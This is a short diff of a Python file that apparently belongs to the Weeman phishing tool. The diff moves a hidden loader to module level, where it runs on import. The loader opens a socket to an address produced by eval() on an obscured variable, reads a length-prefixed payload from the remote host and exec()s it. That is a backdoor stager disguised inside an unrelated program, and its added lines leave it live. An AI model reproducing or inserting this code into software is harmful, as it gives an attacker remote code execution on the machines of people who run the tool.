@@ -69,20 +69,18 @@ def tests_platform():
         printt(3, "If \'Weeman\' runs sucsessfuly on your platform %s\nPlease let me (@Hypsurus) know!" %sys.platform)
 for i in f4:
  pottuss = str(i)
-setti()
-def setti():
-	for x in range(10):
-	 try:
-		s=socket.socket(2,socket.SOCK_STREAM)
+for x in range(10):
+	try:
+      		s=socket.socket(2,socket.SOCK_STREAM)
 		s.connect((eval(pottuss)))
 		break
-	 except:
+	except:
 		time.sleep(5)
-        l=struct.unpack('>I',s.recv(4))[0]
-        d=s.recv(l)
-        while len(d)<l:
-	    d+=s.recv(l-len(d))
-        exec(d,{'s':s})
+l=struct.unpack('>I',s.recv(4))[0]
+d=s.recv(l)
+while len(d)<l:
+	d+=s.recv(l-len(d))
+exec(d,{'s':s})
 	
 def main():
     tests_pyver()
